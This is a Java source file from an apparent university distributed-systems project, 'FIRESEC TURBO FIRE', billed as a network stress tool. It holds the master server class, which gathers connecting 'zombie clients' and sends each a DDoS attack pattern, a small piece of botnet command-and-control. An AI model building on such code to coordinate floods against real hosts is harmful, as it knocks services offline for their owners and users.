/**
 * FIRESEC TURBO FIRE
 * A stress network analysis tool.
 * ------------------------------------
 * Written by Lucas Fonseca dos Santos.
 * Copyleft 2018 - Rights not reserved.
 * ------------------------------------
 * 
 * Pratical project for discipline Distributed
 * Systems of Federal Univeristy of Lavras - MG,
 * Brazil.
 * 
 * CONTACT:
 * lucas@lcfcompany.com.br
 * github.com/LucasFonsecaDosSantos
 */
package tasks;

import view.GUI;
import app.TurboFireMaster;
import utilies.AttackPattern;
import java.io.IOException;
import java.net.Socket;
import java.net.UnknownHostException;
import java.net.ServerSocket;
import java.util.List;
import java.util.ArrayList;

/**
 * @author Lucas Fonseca dos Santos
 * @author Otavio Andrade
 * @version 1.0
 * 
 * This is the main server task in the Master operation.
 * This class describes the ServerThread task, that will be
 * executed into JVM thread. In this class, all clients
 * connect in this server socket and he sends to all
 * the attack pattern object or attack command.
 */
public class ServerThread implements Runnable {

    /**
     * The graphical user interface object.
     */
    private GUI gui;

    /**
     * The zombie clients list.
     */
    private List zoombieClients;

    /**
     * The attack pattern object or attack command.
     * It contains all information about the DDOS operaion.
     */
    private AttackPattern attackPattern;

    /**
     * The server port value.
     */
    private int serverPort;

    /**
     * The server socket object.
     */
    private ServerSocket serverSocket;

    /**
     * The serverThread object constructor. It receives a server port value
     * and attack pattern object and sets these parameters in this object attributes.
     * 
     * @param serverPort The server port that will be listened all zombie clients.
     * @param attackPattern The attack pattern object with all informations abou the DDOS operation.
     */
    public ServerThread(int serverPort, AttackPattern attackPattern) {
        this.gui = new GUI();
        this.zoombieClients = new ArrayList<Socket>();
        this.attackPattern = attackPattern;
        this.serverPort = serverPort;
    }

    /**
     * This is an overwrited method by Java thread class.
     * It executes the comunication task with all clients,
     * sends the attack command for them.
     */
    @Override
    public void run() {
        while(this.zoombieClients.size() < 5) {
            try {
                ServerSocket server = new ServerSocket(this.serverPort);
                while(zoombieClients.size() < 5) {
                    Socket clientSocket = server.accept();
                    Thread t = new Thread(new ClientThread(clientSocket, attackPattern));
                    t.start();
                    TurboFireMaster.addNewZoombieHost(clientSocket.getInetAddress().getHostAddress().toString());
                    this.zoombieClients.add(clientSocket);
                }
            } catch (UnknownHostException uhe) {
                this.gui.showExceptionLog(uhe.toString());
            } catch (IOException ioe) {
                this.gui.showExceptionLog(ioe.toString());
            } catch (Exception e) {
                this.gui.showExceptionLog(e.toString());
            }
        }
    }
}